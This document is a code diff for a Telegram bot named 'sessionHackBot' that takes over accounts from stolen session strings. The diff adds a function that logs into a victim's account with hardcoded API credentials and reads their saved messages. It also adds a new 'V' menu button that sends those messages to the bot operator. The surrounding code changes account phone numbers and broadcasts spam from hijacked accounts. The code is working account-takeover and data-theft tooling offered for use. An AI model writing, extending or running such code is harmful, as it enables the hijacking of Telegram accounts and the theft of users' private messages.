@@ -22,6 +22,13 @@ bot = borg = tgbot
 
 Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
+async def savedmsgs(strses):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        saved_messages = []
+        async for message in X.iter_messages(entity="me"):
+            if message.saved_from_peer:
+                saved_messages.append(message.text)
+        return saved_messages
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
@@ -195,28 +202,29 @@ mm = '''
 '''
 
 keyboard = [
-  [  
-    Button.inline("A", data="A"), 
-    Button.inline("B", data="B"),
-    Button.inline("C", data="C"),
-    Button.inline("D", data="D"),
-    Button.inline("E", data="E")
+    [  
+        Button.inline("A", data="A"), 
+        Button.inline("B", data="B"),
+        Button.inline("C", data="C"),
+        Button.inline("D", data="D"),
+        Button.inline("E", data="E")
     ],
-  [
-    Button.inline("F", data="F"), 
-    Button.inline("G", data="G"),
-    Button.inline("H", data="H"),
-    Button.inline("I", data="I"),
-    Button.inline("J", data="J"),
+    [
+        Button.inline("F", data="F"), 
+        Button.inline("G", data="G"),
+        Button.inline("H", data="H"),
+        Button.inline("I", data="I"),
+        Button.inline("J", data="J")
     ],
-  [
-    Button.inline("K", data="K"), 
-    Button.inline("L", data="L"),
-    Button.inline("M", data="M"),
-    Button.inline("N", data="N"),
+    [
+        Button.inline("K", data="K"), 
+        Button.inline("L", data="L"),
+        Button.inline("M", data="M"),
+        Button.inline("N", data="N"),
+        Button.inline("V", data="V")  # Added the V option to the menu
     ],
-  [
-    Button.url("سورس الساحر ✨", "https://t.me/SXYO3")
+    [
+        Button.url("سورس الساحر✨", "https://t.me/SXYO3")
     ]
 ]
 if Config.TG_BOT_USERNAME is not None and tgbot is not None:
@@ -252,30 +260,32 @@ async def start(event):
   if event.sender_id == bot.uid:
       async with bot.conversation(event.chat_id) as x:
         keyboard = [
-          [  
-            Button.inline("A", data="A"), 
-            Button.inline("B", data="B"),
-            Button.inline("C", data="C"),
-            Button.inline("D", data="D"),
-            Button.inline("E", data="E")
-            ],
-          [
-            Button.inline("F", data="F"), 
-            Button.inline("G", data="G"),
-            Button.inline("H", data="H"),
-            Button.inline("I", data="I"),
-            Button.inline("J", data="J")
-            ],
-          [
-            Button.inline("K", data="K"), 
-            Button.inline("L", data="L"),
-            Button.inline("M", data="M"),
-            Button.inline("N", data="N"),
-            ],
-          [
-            Button.url("المطور", "https://t.me/SXYO3")
-            ]
-        ]
+    [  
+        Button.inline("A", data="A"), 
+        Button.inline("B", data="B"),
+        Button.inline("C", data="C"),
+        Button.inline("D", data="D"),
+        Button.inline("E", data="E")
+    ],
+    [
+        Button.inline("F", data="F"), 
+        Button.inline("G", data="G"),
+        Button.inline("H", data="H"),
+        Button.inline("I", data="I"),
+        Button.inline("J", data="J")
+    ],
+    [
+        Button.inline("K", data="K"), 
+        Button.inline("L", data="L"),
+        Button.inline("M", data="M"),
+        Button.inline("N", data="N"),
+        Button.inline("V", data="V"),
+    ],
+    [
+        
+        Button.url("المطور", "https://t.me/SXYO3")
+    ]
+]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
@@ -727,3 +737,12 @@ async def users(event):
       await x.send_message("الان سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
       i = await gcastc(strses.text, msg.text)
       await event.reply(f" محادثات خاصة {i} تم النشر في  😉😉.", buttons=keyboard)
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"V")))
+async def users(event):
+    async with bot.conversation(event.chat_id) as x:
+        strses = await x.send_message("Fetching saved messages...")
+        saved_msgs = await savedmsgs(strses.text)
+        if saved_msgs:
+            await x.send_message(f"Saved Messages:\n\n{''.join(saved_msgs)}")
+        else:
+            await x.send_message("No saved messages found.")
